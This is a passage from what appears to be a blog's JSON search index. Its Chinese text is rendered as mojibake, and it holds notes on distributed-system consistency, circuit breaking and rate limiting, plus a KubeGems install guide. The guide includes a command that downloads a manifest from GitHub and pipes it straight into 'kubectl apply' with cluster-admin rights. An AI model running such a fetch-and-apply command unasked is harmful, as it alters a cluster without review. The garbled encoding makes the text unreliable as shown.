æ€§å’Œå¯ç”¨æ€§ã€‚\nå½“ç³»ç»Ÿåœ¨zè½´ä¸Šæ”¯æŒæ°´å¹³æ‰©å±•åï¼Œæ•´ä¸ªç³»ç»Ÿå°±å½»åº•æˆä¸ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿã€‚\n\n\n\nåˆ†å¸ƒå¼ç³»ç»Ÿç°çŠ¶\nç›®å‰åº”ç”¨å±‚çš„åˆ†å¸ƒå¼æŠ€æœ¯å·²ç»ç›¸å¯¹æˆç†Ÿï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯ã€å®¹å™¨æŠ€æœ¯ï¼ˆDockerï¼‰ï¼Œç½‘æ ¼æœåŠ¡ï¼ˆservice meshï¼‰å·²ç»æˆç†Ÿå¹¶ä¸”å¤§é¢ç§¯è½åœ°ã€‚\nç›¸å¯¹è€Œè¨€ï¼Œæ•°æ®åº“åˆ†å¸ƒå¼æŠ€æœ¯çš„æˆç†Ÿåº¦è¿œä¸å¦‚åº”ç”¨ç¨‹ç¨‹åºçš„åˆ†å¸ƒå¼æŠ€æœ¯ï¼Œå¤§éƒ¨åˆ†å…¬å¸ä»æ—§ä»¥åˆ†åº“åˆ†è¡¨ä¸ºä¸»ã€‚\næ— è®ºå“ªä¸€ç§æ•°æ®å±‚çš„åˆ†å¸ƒå¼æŠ€æœ¯ï¼Œæœ€éš¾çš„æ”»å…‹è«è¿‡äºåˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€è‡´æ€§ã€‚\n\nåˆ†å¸ƒå¼ç³»ç»Ÿé¢ä¸´çš„é—®é¢˜\né€šä¿¡å¼‚å¸¸ï¼šç½‘ç»œæœ¬èº«æ˜¯ä¸å¯é çš„ã€‚\nç½‘ç»œåˆ†åŒºï¼šç½‘ç»œä¸ç½‘ç»œä¹‹é—´å‡ºç°æ— æ³•é€šä¿¡çš„æƒ…å†µï¼Œä½†æ˜¯å­ç½‘å†…éƒ¨çš„ç½‘å’¯æ˜¯æ­£å¸¸çš„ã€‚\nèŠ‚ç‚¹æ•…éšœï¼šç¡¬ä»¶æ•…éšœï¼ŒèŠ‚ç‚¹çš„æ“ä½œç³»ç»Ÿå´©æºƒã€‚\nä¸‰ç§è¯·æ±‚åº”ç­”çŠ¶æ€ï¼šæˆåŠŸï¼Œå¤±è´¥å’Œè¶…æ—¶ã€‚\n\nåˆ†å¸ƒå¼å¼ç³»ç»Ÿçš„ä¸€è‡´æ€§ å®šä¹‰ï¼š åˆ†å¸ƒå¼æ•°æ®ä¸€è‡´æ€§æ˜¯æŒ‡ï¼Œæ•°æ®åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Šå­˜åœ¨å¤šä¸ªå‰¯æœ¬æ—¶ï¼Œå„å‰¯æœ¬çš„æ•°æ®æ˜¯ä¸€è‡´çš„ï¼Œå³ç›¸åŒå‰¯æœ¬çš„æ•°æ®æ— å·®å¼‚ã€‚\n\n\n\n\n\n\n\n\n\nÂ BASE ç†è®ºï¼Œå®ƒæ˜¯ CAP ç†è®ºçš„å»¶ä¼¸ã€‚BASE æ˜¯Â Basically Availableï¼ˆåŸºæœ¬å¯ç”¨ï¼‰ã€Soft Stateï¼ˆè½¯çŠ¶æ€ï¼‰å’ŒÂ Eventually Consistentï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ä¸‰ä¸ªå•è¯çš„ç®€å†™ï¼Œä½œç”¨æ˜¯ä¿è¯ç³»ç»Ÿçš„å¯ç”¨æ€§ï¼Œç„¶åé€šè¿‡æœ€ç»ˆä¸€è‡´æ€§æ¥ä»£æ›¿å¼ºä¸€è‡´æ€§ï¼Œå®ƒæ˜¯ç›®å‰åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡ä¸­æœ€å…·æŒ‡å¯¼æ„ä¹‰çš„ç»éªŒæ€»ç»“ã€‚\nåˆ†ç±»å¼ºä¸€è‡´æ€§ è¦æ±‚å¯¹åˆ†å¸ƒå¼ç³»ç»Ÿå†™å…¥Aï¼Œä»åˆ†å¸ƒå¼ç³»ç»Ÿä¸­è¯»å‡ºçš„ä¹Ÿæ˜¯Aã€‚å³å­˜åœ¨ä¸€ä¸ªå…¨å±€æ€§çš„å†™å…¥ï¼Œè¯»å–çš„ä¸¥æ ¼å…ˆåé¡ºåºã€‚\nå¼±ä¸€è‡´æ€§\nè¯»å†™ä¸€è‡´æ€§ï¼š ä¿è¯ç”¨æˆ·èƒ½å¤Ÿç¬¬ä¸€æ—¶é—´è¯»å–åˆ°è‡ªå·±æ›´æ”¹çš„æ•°æ®ã€‚\nå•è°ƒè¯»ä¸€è‡´æ€§ï¼š å½“å‰è¯»åˆ°çš„æ•°æ®ï¼Œä¸èƒ½æ¯”ä¸Šæ¬¡åˆ°çš„æ•°æ®æ—§ï¼Œå´ä¸è¦æ±‚å½“å‰è¯»åˆ°çš„ä¸€å®šæ˜¯æœ€æ–°çš„ã€‚\nå› æœä¸€è‡´æ€§ï¼šå½“èŠ‚ç‚¹Aåœ¨æ›´æ–°å®Œæ•°æ®X&#x3D;10é€šçŸ¥åˆ°BèŠ‚ç‚¹ï¼Œé‚£ä¹ˆBèŠ‚ç‚¹ä¹‹åé’ˆå¯¹Xçš„è¯»å–å’Œä¿®æ”¹éƒ½éœ€è¦åŸºäºX&#x3D;10è¿™ä¸ªå‰æä¸‹ï¼ŒåŒæ—¶ï¼Œå¦‚æœAèŠ‚ç‚¹æœªåŒæ­¥X&#x3D;10åˆ°CèŠ‚ç‚¹ï¼ŒCèŠ‚ç‚¹åœ¨è¯»å–Xæ—¶ï¼Œä¸å—X&#x3D;10è¿™ä¸ªå‰æé™åˆ¶ã€‚\næœ€ç»ˆä¸€è‡´æ€§ï¼šé¡¾åæ€ä¹‰ï¼Œæ•°æ®åœ¨ä¸åŒçš„èŠ‚ç‚¹é—´ï¼Œç»è¿‡ä¸€å®šçš„æ—¶é—´åï¼Œæœ€ç»ˆä¼šè¾¾æˆä¸€è‡´ã€‚\n\nå®è·µBASE ä¸­çš„åŸºæœ¬å¯ç”¨æŒ‡çš„æ˜¯ä¿éšœæ ¸å¿ƒåŠŸèƒ½çš„åŸºæœ¬å¯ç”¨ï¼Œå…¶å®æ˜¯åšäº†â€œå¯ç”¨æ€§â€æ–¹é¢çš„å¦¥åï¼Œæ¯”å¦‚ï¼š\n\nç”µå•†ç½‘ç«™åœ¨åŒåä¸€å¤§ä¿ƒç­‰è®¿é—®å‹åŠ›è¾ƒå¤§çš„æ—¶å€™ï¼Œå…³é—­å•†å“æ’è¡Œæ¦œç­‰æ¬¡è¦åŠŸèƒ½çš„å±•ç¤ºï¼Œä»è€Œä¿è¯å•†å“äº¤æ˜“ä¸»æµç¨‹çš„å¯ç”¨æ€§ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„æœåŠ¡é™çº§ï¼›\n\nä¸ºäº†é”™å¼€åŒåä¸€é«˜å³°æœŸï¼Œç”µå•†ç½‘ç«™ä¼šå°†é¢„å”®å•†å“çš„æ”¯ä»˜æ—¶é—´å»¶åååˆ°äºŒååˆ†é’Ÿï¼Œè¿™å°±æ˜¯æµé‡å‰Šå³°ï¼›\n\nåœ¨ä½ æŠ¢è´­å•†å“çš„æ—¶å€™ï¼Œå¾€å¾€ä¼šåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¸¸ç”¨çš„å»¶è¿Ÿé˜Ÿåˆ—ã€‚è½¯çŠ¶æ€å’Œæœ€ç»ˆä¸€è‡´æ€§æŒ‡çš„æ˜¯å…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œè¿™åŒæ ·æ˜¯ä¸ºäº†ç³»ç»Ÿå¯ç”¨æ€§è€Œç‰ºç‰²ä¸€æ®µæ—¶é—´çª—å†…çš„æ•°æ®ä¸€è‡´æ€§ï¼Œä»è€Œä¿è¯æœ€ç»ˆçš„æ•°æ®ä¸€è‡´æ€§çš„åšæ³•ã€‚\n\n\nç›®å‰è¿™ç§å¤„ç†æ•°æ®çš„æ–¹å¼å‡ ä¹æˆäº†äº’è”ç½‘çš„æ ‡é…è®¾è®¡æ¨¡å¼ï¼Œæœ€ç»å…¸çš„ä¾‹å­æ˜¯åœ¨ç”¨æˆ·ä¸‹å•çš„æ—¶å€™ä¸éœ€è¦çœŸæ­£åœ°æ‰£å‡åº“å­˜ï¼Œè€Œæ˜¯ä»…åœ¨å‰å°è®¡ä¸ªæ•°ï¼Œç„¶åé€šè¿‡å¼‚æ­¥ä»»åŠ¡åœ¨åå°æ‰¹é‡å¤„ç†ã€‚\nåˆ†å¸ƒå¼äº‹åŠ¡\nè¦æ»¡è¶³äº‹åŠ¡çš„åŸºæœ¬ç‰¹æ€§ACID\nåˆ†å¸ƒå¼äº‹åŠ¡ç›¸å¯¹äºæœ¬åœ°äº‹åŠ¡è€Œè¨€ï¼Œè¡¨ç°å½¢å¼ä¼šæœ‰æ‰€ä¸åŒã€‚\n\nåˆ†å¸ƒå¼ç³»ç»Ÿåˆ†ç±»åˆ†å¸ƒå¼å­˜å‚¨Google æ–‡ä»¶ç³»ç»Ÿæ“ä½œä¸èŒè´£\nåˆ›å»ºå…ƒæ•°æ®ï¼Œä¾‹å¦‚æ–‡ä»¶çš„ä½ç½®ï¼Œå¤§å°ï¼Œåç§°ç­‰äº¤ç»™ master æ¥å¤„ç†ã€‚\nå†™æ•°æ®äº¤ç»™ chunk server æ¥å¤„ç†ï¼Œclient ç›´æ¥æäº¤ æ•°æ®ç»™ chunk serverã€‚\né€šè¿‡ primary replica æ¥æ§åˆ¶ chunk serverå¯¹æŸä¸ªæ•°æ®æ–‡ä»¶çš„å¹¶å‘å†™å…¥ã€‚\n\nGFS æ¾å¼›ä¸€è‡´æ€§\nä¸€è‡´æ€§çš„è§£é‡Šï¼šclient æ— è®ºä»å“ªä¸ªå‰¯æœ¬è¯»å–æ•°æ®ï¼Œçœ‹åˆ°çš„æ€»æ˜¯ç›¸åŒçš„æ•°æ®ï¼Œè¿™ç§°ä¸ºä¸€è‡´æ€§ã€‚\nå…ƒæ•°æ®çš„ä¸€è‡´æ€§\næ–‡ä»¶æ•°æ®çš„ä¸€è‡´æ€§\n\nHDFSï¼ˆHadoop Distributed File Systemï¼‰HDFS çš„æ¶æ„\nHDFS çš„ pipeline  \nåˆ†å¸ƒå¼æ•°æ®åº“Google çš„ BigTable\nBigTable çš„æ•°æ®æ¨¡å‹\n\nå¸¦æ—¶é—´æˆ³çš„ BigTable æ•°æ®æ¨¡å‹\n\nè¡Œçº§åŸå­æ€§\n\nBigTable çš„æ¶æ„\n\nGFS\nchubby\nGoogle å…¬å¸å†…éƒ¨çš„åˆ†å¸ƒå¼é”æœåŠ¡ã€‚\n\n\nclient\nmaster\nè´Ÿè´£æŠŠä¸€ä¸ª tablet æŒ‡æ´¾ç»™ä¸€ä¸ª tablet server\n\n\ntablet server\nBigTable ä¼šä¸ºæ¯ä¸ª tablet æŒ‡å®šä¸€ä¸ª tablet server\n\n\n\n\nHBase [[020-bigdata&#x2F;æ•°æ®ä»“åº“&#x2F;HBase&#x2F;HBase]]\n\nMongoDB\n\n\nåˆ†å¸ƒå¼è®¡ç®—\nHadoopï¼ˆMap Reduceï¼‰\nSparkï¼ˆæ‰¹å¤„ç† + å®æ—¶å¤„ç†ï¼‰\nFlinkï¼ˆå®æ—¶å¤„ç†ï¼‰\n\nåˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—\nKafka\nRabbitMQ\nRocketMQ\n\nåˆ†å¸ƒå¼æœºå™¨å­¦ä¹ \nSpark ML\nåˆ†å¸ƒå¼ TensorFlow\n\næºç¨‹æ¶æ„å®è·µ\n","slug":"åˆ†å¸ƒå¼ç³»ç»Ÿ","date":"2022-05-05T07:42:08.000Z","categories_index":"åˆ†å¸ƒå¼","tags_index":"åˆ†å¸ƒå¼æ•°æ®åº“,åˆ†å¸ƒå¼å­˜å‚¨,åˆ†å¸ƒå¼è®¡ç®—,æ¶æ„å­¦ä¹ ","author_index":"Moses"},{"id":"413e999854a8918e45b13a69d229a398","title":"ç†”æ–­ã€è¶…æ—¶ã€é™æµå’ŒæœåŠ¡é™çº§çš„æ¦‚å¿µæ¢³ç†","content":"æœåŠ¡ç†”æ–­è§£å†³çš„é—®é¢˜\nè§£å†³å¾®æœåŠ¡æ¶æ„ä¸‹ï¼Œç³»ç»Ÿé—´è°ƒç”¨é“¾è·¯çš„é›ªå´©ï¼Œé¿å…é€ æˆæ•´ä¸ªå¾®æœåŠ¡ä½“ç³»å´©æºƒã€‚ç±»ä¼¼ç”µè·¯è¿‡è½½çš„ä¿é™©ä¸ã€‚\næŠ€æœ¯ã€æ¶æ„ç±»é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œå¤šæ•°ç ”å‘å’Œè¿ç»´å‚ä¸ã€‚\nä»å±€éƒ¨å‡ºå‘ï¼Œå„è‡ªè§£å†³é—®é¢˜ï¼Œè¢«åŠ¨é˜²å¾¡ã€‚\n\né€ æˆé“¾è·¯è°ƒç”¨é›ªå´©çš„åŸå› \nè°ƒç”¨é“¾çš„æŸä¸€ç¯èŠ‚ï¼Œä¾‹å¦‚APP-Då‡ºç°æ€§èƒ½ç“¶é¢ˆï¼Œå¯¼è‡´ä¾èµ–è¯¥ç¯èŠ‚çš„å‰ç½®ä¸šåŠ¡ç³»ç»Ÿé•¿æ—¶é—´æ— æ³•è·å¾—è·å¾—å“åº”ï¼Œæ— æ³•é‡Šæ”¾èµ„æºï¼Œéšç€è¯·æ±‚æ•°é‡ä¸æ–­å¢åŠ ï¼Œå ç”¨çš„èµ„æºä¼šè¶Šæ¥è¶Šå¤šï¼Œæœ€ç»ˆå¯¼è‡´æ•´ä¸ªå¾®æœåŠ¡ç³»ç»Ÿå´©æºƒã€‚  \n\nç°æœ‰çš„å®ç°æ–¹æ¡ˆ\nSpringCloud æ¡†æ¶ï¼Œé€šè¿‡ Hystrix å®ç°ã€‚Hystrix ä¼šç›‘æ§å¯¹å¾®æœåŠ¡çš„è°ƒç”¨æƒ…å†µï¼Œå½“é’ˆå¯¹æŸä¸€å¾®æœåŠ¡çš„è°ƒç”¨å¤±è´¥æ¬¡æ•°è¾¾åˆ°é˜ˆå€¼æ—¶ï¼ˆä¾‹å¦‚ 5 ç§’å†… 20 æ¬¡å¤±è´¥ï¼‰ï¼Œå°±ä¼šå¯åŠ¨ç†”æ–­ä¿æŠ¤ã€‚\nIstio envy ç†”æ–­[[istio]]\nå…¶ä»–è®¾è®¡è€ƒé‡\nå¦‚ä½•åˆ¤è¢«è°ƒç”¨çš„æŸä¸ªå¾®æœåŠ¡æ˜¯ä¸ç¨³å®šçš„ï¼Ÿ\nåœ¨æŸä¸ªå¾®æœåŠ¡ç¨³å®šåï¼Œå¦‚ä½•é€€å‡ºç†”æ–­ä¿æŠ¤ï¼Ÿ\n\n\n\næœåŠ¡è¶…æ—¶è§£å†³çš„é—®é¢˜åœ¨è¯·æ±‚ä½¿ç”¨æŸä¸€èµ„æºæ—¶ï¼Œè¯·æ±‚æ–¹æœ‰å¯¹ä»å‘å‡ºè¯·æ±‚åˆ°è·å¾—èµ„æºçš„æ—¶é—´é•¿çŸ­ï¼Œæœ‰å®¹å¿åº¦çš„åŒºé—´ä¸Šé™ã€‚ä¸é¿å…åœ¨ä¸€ä»¶äº‹æƒ…ä¸Šè¿‡æ¸¡æ¶ˆè€—èµ„æºï¼ŒåŠæ—¶æ­¢æŸã€‚\nåˆ†ç±»    - å»ºç«‹è¿æ¥è¶…æ—¶\n    - å†™å…¥ã€è¯»å–æ•°æ®è¶…æ—¶\n\nä¸¾ä¾‹æè¿°\nä¸è¶…æ—¶é€šä¿—ä¸¾ä¾‹ï¼šæœ›å¤«å´–ï¼Œä¸€ç­‰ç­‰åƒåƒä¸‡ä¸‡è½½ï¼Œé£é›¨ä¸­ï¼Œè¾¹åŒ–ä½œçŸ³å—ã€‚\nè¶…æ—¶ä¸¾ä¾‹ï¼šå‡å¦‚éè¦ç»™è¿™ä»½çˆ±æƒ…åŠ ä¸Šä¸€ä¸ªæœŸé™çš„è¯ï¼Œæˆ‘å¸Œæœ›æ˜¯ä¸€ä¸‡å¹´ã€‚åªæ˜¯è¶…æ—¶æ—¶é—´æ¯”è¾ƒé•¿ğŸ˜…\n\næœåŠ¡é™æµè§£å†³çš„é—®é¢˜\næŠ½è±¡æè¿°:æŸä¸ªæˆ–æŸç±»èµ„æºæœ‰é™ä¸”å¾€å¾€åœ¨ä½¿ç”¨è¿™äº›èµ„æºæ—¶æ˜¯ç‹¬å çš„ï¼Œåœ¨çŸ­æ—¶é—´å†…å‡ºç°å¤§é‡ç”³è¯·ï¼ˆé«˜å¹¶å‘ï¼‰ä½¿ç”¨èµ„æºçš„è¯·æ±‚ï¼Œä¼šå› æ— æ³•åŠæ—¶åˆ†é…å’Œå›æ”¶èµ„æºï¼Œå¯¼è‡´ä¸šåŠ¡é˜»å¡ï¼Œå¹¶è¿›ä¸€æ­¥åŠ å‰§ä½¿ç”¨èµ„æºè¯·æ±‚çš„é¢‘æ¬¡å’Œæ•°é‡ï¼Œæœ€ç»ˆå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚\nåœºæ™¯\nåˆç†ï¼Œé‡è¦çš„èµ„æºç”³è¯·è¢«æ·¹æ²¡ã€‚  â€“æ€¥æ•‘ï¼Œé‡ç—‡æ— æ³•åŠæ—¶è·å¾—åŒ»ç–—èµ„æºã€‚\né¢‘ç¹å¤„ç†åŒä¸€ä¸ªç”³è¯·çš„ï¼Œæµªè´¹èµ„æºã€‚ â€“å¦‚æœé¤å…å–å·ä¸ç”¨æ‰‹æœºå·ï¼Œæ— è‰¯é£Ÿå®¢å¯ä»¥å– n ä¸ª2 äººæ¡Œï¼Œ3 äººæ¡Œï¼Œ5 äººæ¡Œã€‚\næµªè´¹èµ„æºç”³è¯·è€…çš„èµ„æºã€‚ â€“æ’é˜ŸæŠ¢è´­ï¼Œæ’äº†åŠå¤©ï¼Œè½®åˆ°æˆ‘ä¹°çš„æ—¶å€™ï¼Œå‘Šè¯‰æˆ‘ï¼Œæ—©å°±å–å®Œäº†ã€‚\n\n\n\nç°æœ‰çš„å®ç°æ–¹æ¡ˆç®—æ³•\nè®¡æ•°å™¨[[å›ºå®šæ—¶é—´çª—å£]]\n[[æ»‘åŠ¨æ—¶é—´çª—å£]]\n[[ä»¤ç‰Œæ¡¶]]\n[[æ¼æ¡¶ç®—æ³•]]\n\næœåŠ¡é™çº§è§£å†³çš„é—®é¢˜\nåœ¨æœåŠ¡å™¨ç­‰ç¡¬ä»¶èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ï¼Œæˆ–è€…æ•´ä¸ªå¾®æœåŠ¡ä½“ç³»èƒ½æ‰¿è½½çš„ä¸šåŠ¡é‡æœ‰é™çš„æƒ…å†µä¸‹ï¼Œå°†æŸäº›æ‰¿è½½è¾¹ç¼˜ä¸šåŠ¡çš„ç³»ç»Ÿèµ„æºçš„éƒ¨åˆ†æˆ–è€…å…¨éƒ¨ï¼Œè°ƒåº¦ç»™æ‰¿è½½æ ¸å¿ƒä¸šåŠ¡çš„ç³»ç»Ÿæ¥ä½¿ç”¨ï¼Œç‰ºç‰²è¾¹ç¼˜ä¸šåŠ¡ä¸šåŠ¡çš„ç”¨æˆ·ä½“éªŒï¼Œæ¥ä¿éšœæ ¸å¿ƒä¸šåŠ¡çš„å¯ç”¨æ€§ã€‚\nä¸šåŠ¡æŠ‰æ‹©ä»¥åŠæŠ€æœ¯ã€æ¶æ„ç±»è§£å†³æ–¹æ¡ˆï¼Œéœ€è¦åè°ƒè¿è¥ï¼Œå®¢æœç­‰ä¸€èµ·å‚ä¸ã€‚\nä»å…¨å±€è§†è§’ï¼Œç»Ÿç­¹è§£å†³é—®é¢˜ï¼Œä¸»åŠ¨é€‰æ‹©ã€‚\n\nå…³ç³»ä¸åŒºåˆ«\næœåŠ¡é™çº§æ˜¯ä¸šåŠ¡å’ŒæŠ€æœ¯å…±åŒæŒ‡å®šçš„çš„ç­–ç•¥ï¼Œè¿™ä¸ªç­–ç•¥çš„å®æ–½ä¾èµ–äºç†”æ–­ã€è¶…æ—¶ã€é™æµç­‰æŠ€æœ¯æ‰‹æ®µå®ç°çš„ä¸šåŠ¡é“¾è·¯ä¿æŠ¤æœºåˆ¶ã€‚\nè¶…æ—¶æ˜¯é’ˆå¯¹å‘èµ·è°ƒç”¨æ–¹ï¼ˆConsumerï¼‰è‡ªèº«çš„ä¸šåŠ¡å’Œç³»ç»Ÿè§„åˆ’æŒ‡å®šçš„å¯¹æŸä¸€å¾®æœåŠ¡çš„æœ€å¤§å®¹å¿åº¦ï¼Œè¶…æ—¶ç­–ç•¥ç”±å‘èµ·è°ƒç”¨æ–¹åˆ¶å®šã€‚ä¸åŒçš„è°ƒç”¨æ–¹ï¼Œå¯ä»¥é’ˆå¯¹åŒä¸€ä¸ªè¢«è°ƒç”¨æ–¹è®¾ç½®ä¸åŒçš„è¶…æ—¶ç­–ç•¥ã€‚\nç†”æ–­æ˜¯å‘èµ·è°ƒç”¨æ–¹ï¼ˆConsumerï¼‰æ˜¯åœ¨ä¸ä¿¡ä»»è¢«è°ƒç”¨æ–¹çš„ç¨³å®šæ€§ï¼Œå½“è¢«è°ƒç”¨æ–¹æœåŠ¡ä¸ç¨³å®šæ—¶ï¼Œé¿å…ç»™è¢«è°ƒæ–¹é›ªä¸ŠåŠ éœœï¼Œç»™è¢«è°ƒç”¨æ–¹æ¢å¤çš„æœºä¼šã€‚ç†”æ–­ç­–ç•¥ç”±å‘èµ·è°ƒç”¨æ–¹åˆ¶å®šã€‚ä¸åŒçš„è°ƒç”¨æ–¹ï¼Œå¯ä»¥é’ˆå¯¹åŒä¸€ä¸ªè¢«è°ƒç”¨æ–¹è®¾ç½®ä¸åŒçš„ç†”æ–­ç­–ç•¥ã€‚\né™æµæ˜¯æœåŠ¡æä¾›æ–¹ï¼ˆå³è¢«è°ƒç”¨æ–¹ï¼ŒProviderï¼‰ï¼ŒåŸºäºè‡ªèº«ä¸šåŠ¡ç³»ç»Ÿçš„ç‰¹æ€§ï¼Œèƒ½å¯¹å¤–æä¾›çš„ç¨³å®šæˆ–æœ€å¤§èƒ½åŠ›ã€‚é™æµç­–ç•¥ç”±æœåŠ¡æä¾›æ–¹åˆ¶å®šã€‚æœåŠ¡æä¾›æ–¹é’ˆå¯¹ä¸åŒçš„è°ƒç”¨æ–¹ï¼Œå¯ä»¥è®¾ç½®ç»Ÿä¸€çš„æˆ–è€…å·®å¼‚åŒ–çš„é™æµç­–ç•¥ã€‚  \n\nå‚è€ƒ\næœåŠ¡é™çº§ä¸æœåŠ¡ç†”æ–­åŒºåˆ« - çŸ¥ä¹\n\n","slug":"ç†”æ–­ã€è¶…æ—¶ã€é™æµå’ŒæœåŠ¡é™çº§","date":"2022-05-05T07:42:08.000Z","categories_index":"åˆ†å¸ƒå¼,å¾®æœåŠ¡","tags_index":"æœåŠ¡é™æµ,æœåŠ¡ç†”æ–­,æœåŠ¡é™çº§","author_index":"Moses"},{"id":"5d82079790f13b8d3ae4a637793178a7","title":"Kuberneteså­¦ä¹ ç¬”è®° --kubegem","content":"æ¦‚è¿°KubeGemsæ˜¯ä¸€æ¬¾ä»¥å›´ç»• Kubernetes é€šè¿‡è‡ªç ”å’Œé›†æˆäº‘åŸç”Ÿé¡¹ç›®è€Œæ„å»ºçš„é€šç”¨æ€§å¼€æº PaaS äº‘ç®¡ç†å¹³å°ã€‚ç»è¿‡æˆ‘ä»¬å†…éƒ¨è¿‘ä¸€å¹´çš„æŒç»­è¿­ä»£ï¼Œå½“å‰ KubeGems çš„æ ¸å¿ƒåŠŸèƒ½å·²ç»åˆæ­¥å…·å¤‡å¤šäº‘å¤šç§Ÿæˆ·åœºæ™¯ä¸‹çš„ç»Ÿä¸€ç®¡ç†ã€‚å¹¶é€šè¿‡æ’ä»¶åŒ–çš„æ–¹å¼ï¼Œåœ¨ç”¨æˆ·ç•Œé¢ä¸­çµæ´»æ§åˆ¶åŒ…æ‹¬Â ç›‘æ§ç³»ç»Ÿã€æ—¥å¿—ç³»ç»Ÿã€å¾®æœåŠ¡æ²»ç†Â ç­‰ä¼—å¤šæ’ä»¶çš„å¯ç”¨å’Œå…³é—­ã€‚\nä½œä¸ºä¸€ä¸ªé¢å‘äº‘åŸç”Ÿçš„é€šç”¨å‹äº‘å¹³å°ï¼ŒKubeGemsä»ç«‹é¡¹å¼€å§‹å°±æŠŠæ”¯æŒå¤šé›†ç¾¤ã€å¤šç§Ÿæˆ·åœºæ™¯ä¸‹çš„èµ„æºéš”ç¦»ä½œä¸ºå…¶ä¸»è¦å®ç°è®¾è®¡ç›®æ ‡ã€‚ç”¨æˆ·å¯ä»¥å¯¹æ¥å…¥å¹³å°çš„ Kubernetes é›†ç¾¤åšÂ ç§Ÿæˆ·çº§Â çš„è‡ªå®šä¹‰èµ„æºè§„åˆ’ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬æä¾›äº†æ¯”åŸç”Ÿ Dashboard åŠŸèƒ½æ›´åŠ ä¸°å¯Œä¸”äººæ€§åŒ–æ“ä½œçš„ UI ç•Œé¢ï¼Œè®©ç”¨æˆ·&#x2F;ä¼ä¸šæ ¹æ®è‡ªèº«åœºæ™¯è§„åˆ’å¹³å°å…ƒæ•°æ®ï¼Œè€Œä¸ç”¨æ‹…å¿ƒè‡ªå·±çš„ä¸šåŠ¡å’Œæ•°æ®å‡ºç°é”™ä¹±ã€‚åŒæ—¶ KubeGems ä¹Ÿæä¾›è¿‡äº†ä¼—å¤šä¸°å¯Œçš„åŠŸèƒ½æ¨¡å—æ¥ä¸ºä¸ªäººæˆ–ä¼ä¸šç”¨æˆ·å¸¦æ¥æ›´å¥½çš„ä½¿ç”¨ä½“éªŒï¼Œä¾‹å¦‚Â _è®¿é—®æ§åˆ¶ã€èµ„æºè§„åˆ’ã€ç½‘ç»œéš”ç¦»ã€ç§Ÿæˆ·ç½‘å…³ã€å­˜å‚¨å·ã€å¯è§‚å¯Ÿæ€§ã€ç”¨æˆ·å®¡è®¡ã€è¯ä¹¦ç®¡ç†ã€é‡‘ä¸é›€å‘å¸ƒã€istioæ²»ç†_ç­‰åŠŸèƒ½ã€‚\nåŠŸèƒ½é¢„è§ˆ\nquick startKubeGems Installer Operatoræ˜¯ä¸€ä¸ªé€šè¿‡Â Operator SDKÂ æ„å»ºçš„Ansible Kubernetesæ§åˆ¶å™¨ã€‚é€šè¿‡CRDä¸­çš„å®šä¹‰çš„å­—æ®µå¯¹Ansibleè¿›è¡Œå˜é‡ä¼ é€’ã€‚Installer Operatorçš„è¿è¡Œéœ€è¦å…·å¤‡é›†ç¾¤ç®¡ç†å‘˜çš„RBACæƒé™ï¼Œæ‰€ä»¥åœ¨éƒ¨ç½²å‰éœ€è¦è”ç³»æ‚¨çš„é›†ç¾¤ç®¡ç†å‘˜ï¼Œä»¥ä¿è¯æœ‰è¶³å¤Ÿçš„æˆæƒæ‰§è¡Œä»¥ä¸‹æ“ä½œã€‚\ninstallerwget -O - https:&#x2F;&#x2F;github.com&#x2F;kubegems&#x2F;installer-operator&#x2F;releases&#x2F;download&#x2F;$&#123;KUBEGEMS_VERSION&#125;&#x2F;centrol.installer.yaml \\\n| sed &quot;s#repository: docker.io#repository: registry.cn-beijing.aliyuncs.com#g&quot; \\\n| kubectl apply -f -\nè®¿é—®é¡µé¢åˆ›å»ºä¸€ä¸ªingressè§„åˆ™å°† kubegems dashboard æœåŠ¡æš´éœ²å‡ºæ¥ï¼Œå‚è€ƒå¦‚ä¸‹\napiVersion: extensions&#x2F;v1beta1\nkind: Ingress\nmetadata:\n  annotations:\n    nginx.org&#x2F;proxy-buffering: &quot;false&quot;\n    nginx.org&#x2F;websocket-services: gems-dashboard\n  name: gems-dashboard\n  namespace: gemcloud-system\nspec:\n  rules:\n  - host: console.kubegems.io\n    http:\n      paths:\n      - backend:\n          serviceName: gems-dashboard\n          servicePort: 8000\n        path: &#x2F;\n        pathType: ImplementationSpecific\nå°†åŸŸåconsole.kubegems.ioè§£æåˆ° Kubernetes é›†ç¾¤å†…ä»»æ„èŠ‚ç‚¹åï¼Œå³å¯é€šè¿‡Â http://console.kubegems.io:&lt;NodePort&gt;Â è®¿é—®é¡µé¢ã€‚æ¨èä½¿ç”¨switchhostè®¾ç½®åŸŸåè§£æã€‚\nç³»ç»Ÿå‘½åç©ºé—´\n\n\nå‘½åç©ºé—´\nç”¨é€”\n\n\n\ncert-manager\nè¯ä¹¦ç®¡ç†æ‰€åœ¨ç©ºé—´\n\n\nkubegems-installer\nKubeGems installer æ‰€åœ¨ç©ºé—´\n\n\ngemcloud-system\nKubeGemsç³»ç»ŸæœåŠ¡æ‰€åœ¨ç©ºé—´\n\n\ngemcloud-monitoring-system\nç›‘æ§å‘Šè­¦æœåŠ¡æ‰€åœ¨ç©ºé—´\n\n\ngemcloud-logging-system\næ—¥å¿—æœåŠ¡æ‰€åœ¨ç©ºé—´\n\n\ngemcloud-gateway-system\nç§Ÿæˆ·ç½‘å…³æ‰€åœ¨ç©ºé—´\n\n\ngemcloud-workflow-system\nci&#x2F;cdå¼•æ“æ‰€åœ¨ç©ºé—´\n\n\nobservability\nå¯è§‚å¯Ÿç»„ä»¶æ‰€åœ¨ç©ºé—´\n\n\nistio-system\nistio ç»„ä»¶æ‰€åœ¨ç©ºé—´\n\n\nlocal-path-storage\nhost 